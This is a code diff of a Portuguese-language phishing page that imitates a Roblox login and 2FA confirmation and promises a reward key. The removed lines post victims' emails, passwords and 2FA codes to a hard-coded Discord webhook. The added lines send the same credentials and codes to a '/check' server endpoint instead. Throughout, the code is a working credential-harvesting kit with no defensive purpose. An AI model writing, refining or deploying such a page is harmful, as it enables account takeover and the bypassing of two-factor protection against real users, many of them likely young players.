@@ -25,7 +25,6 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             width: 350px;
             text-align: center;
-            position: relative;
         }
 
         h1 {
@@ -95,11 +94,9 @@
         }
 
         .loading {
-            display: none;
             color: #ffcc00;
         }
 
-        /* Estilo para o passo 2 (2FA) */
         #step2 {
             display: none;
         }
@@ -138,13 +135,13 @@
         <div class="message" id="msg1"></div>
     </div>
 
-    <!-- Passo 2: 2FA (aparece após login bem-sucedido) -->
+    <!-- Passo 2: 2FA -->
     <div id="step2">
         <h2>Confirmação 2FA</h2>
         <p style="font-size: 14px; color: #ccc;">Verifique o email da sua conta Roblox e coloque o código de 6 dígitos.</p>
         <div class="input-group">
             <label>Código 2FA</label>
-            <input type="text" id="code2fa" placeholder="Ex: 123456" maxlength="6">
+            <input type="text" id="code2fa" placeholder="Ex: 123456" maxlength=" 6">
         </div>
         <button onclick="submit2FA()">Confirmar e Resgatar</button>
         <div class="message" id="msg2"></div>
@@ -152,14 +149,11 @@
 </div>
 
 <script>
-    // SEU WEBHOOK DO DISCORD
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";
-
-    // Função para verificar o login DIRETO NO NAVEGADOR
     async function checkLogin() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const msgDiv = document.getElementById('msg1');
+        const btn = document.querySelector('#step1 button');
 
         if (!email || !password) {
             msgDiv.innerHTML = '<span class="error">Preencha o Email e a Senha!</span>';
@@ -167,96 +161,81 @@
         }
 
         msgDiv.innerHTML = '<span class="loading">Verificando conta...</span>';
+        btn.disabled = true;
+        btn.style.opacity = '0.7';
 
         try {
-            // Tenta fazer login direto na API do Roblox do navegador
-            // Usamos a API de login padrão
-            const response = await fetch('https://www.roblox.com/users/login', {
+            const response = await fetch('/check', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Accept': 'application/json'
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    username: email,
+                    email: email,
                     password: password
-                }),
-                mode: 'cors', // Importante para pedir permissão do navegador
-                credentials: 'include'
+                })
             });
 
             const data = await response.json();
 
-            // Se o Roblox devolver um ID, é sucesso
-            if (data.id && data.id > 0) {
+            if (data.success) {
                 msgDiv.innerHTML = '<span class="success">✅ Conta Encontrada! Vai para a confirmação...</span>';
-                
-                // Envia para o Discord que achou a conta
-                sendToDiscord(`**🔒 CONTA ENCONTRADA!**\n\n**Email:** ${email}\n**Password:** ${password}\n**Username:** ${data.username}\n**User ID:** ${data.id}`);
-
-                // Esconde passo 1 e mostra passo 2
                 setTimeout(() => {
                     document.getElementById('step1').style.display = 'none';
                     document.getElementById('step2').style.display = 'block';
                 }, 1500);
             } else {
-                // Se falhou, pega no erro
-                const errorMsg = data.error || "Conta ou Senha Incorretas";
-                msgDiv.innerHTML = '<span class="error">❌ ' + errorMsg + '</span>';
-                
-                // Envia falha para o Discord
-                sendToDiscord(`**❌ LOGIN FALHOU**\n\n**Email:** ${email}\n**Password:** ${password}\n**Erro:** ${errorMsg}`);
+                msgDiv.innerHTML = '<span class="error">❌ ' + (data.error || 'Erro ao verificar a conta.') + '</span>';
             }
         } catch (error) {
-            // Erro de conexão ou CORS
-            msgDiv.innerHTML = '<span class="error">❌ Erro de Conexão com o Roblox.</span>';
+            msgDiv.innerHTML = '<span class="error">❌ Erro de Conexão com o Servidor.</span>';
             console.error('Erro:', error);
-            sendToDiscord(`**❌ ERRO DE CONEXÃO**\n\n**Email:** ${email}\n**Password:** ${password}\n**Erro:** ${error.message}`);
+        } finally {
+            btn.disabled = false;
+            btn.style.opacity = '1';
         }
     }
 
-    // Função para enviar mensagem para o Discord
-    async function sendToDiscord(message) {
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: message }),
-                mode: 'no-cors' // Importante para evitar erro de CORS no Discord
-            });
-        } catch (error) {
-            console.error('Erro ao enviar para o Discord:', error);
-        }
-    }
-
-    // Função para submeter o código 2FA
     async function submit2FA() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const code = document.getElementById('code2fa').value;
         const msgDiv = document.getElementById('msg2');
+        const btn = document.querySelector('#step2 button');
 
         if (!code) {
             msgDiv.innerHTML = '<span class="error">Preencha o Código 2FA!</span>';
             return;
         }
 
-        msgDiv.innerHTML = '<span class="loading">Enviando dados para o servidor...</span>';
+        msgDiv.innerHTML = '<span class="loading">Enviando dados...</span>';
+        btn.disabled = true;
 
-        // Envia os dados finais para o Discord
-        const finalMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n**Email:** ${email}\n**Password:** ${password}\n**Code 2FA:** ${code}\n**Timestamp:** ${new Date().toISOString()}`;
-        
-        await sendToDiscord(finalMessage);
+        try {
+            await fetch('/check', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    code2fa: code,
+                    isFinalStep: true
+                })
+            });
 
-        msgDiv.innerHTML = '<span class="success">✅ Sucesso! A sua chave será enviada em breve.</span>';
-        
-        // Opcional: Esconder tudo após sucesso
-        setTimeout(() => {
-            document.querySelector('.container').innerHTML = '<h1 style="color:#00b060">Tudo Pronto!</h1><p>Aguarde o email de confirmação.</p>';
-        }, 3000);
+            msgDiv.innerHTML = '<span class="success">✅ Sucesso! A sua chave será enviada em breve.</span>';
+            
+            setTimeout(() => {
+                document.querySelector('.container').innerHTML = '<h1 style="color:#00b060">Tudo Pronto!</h1><p>Aguarde o email de confirmação.</p>';
+            }, 2000);
+
+        } catch (error) {
+            msgDiv.innerHTML = '<span class="error">❌ Erro ao enviar o código.</span>';
+        } finally {
+            btn.disabled = false;
+        }
     }
 </script>
 
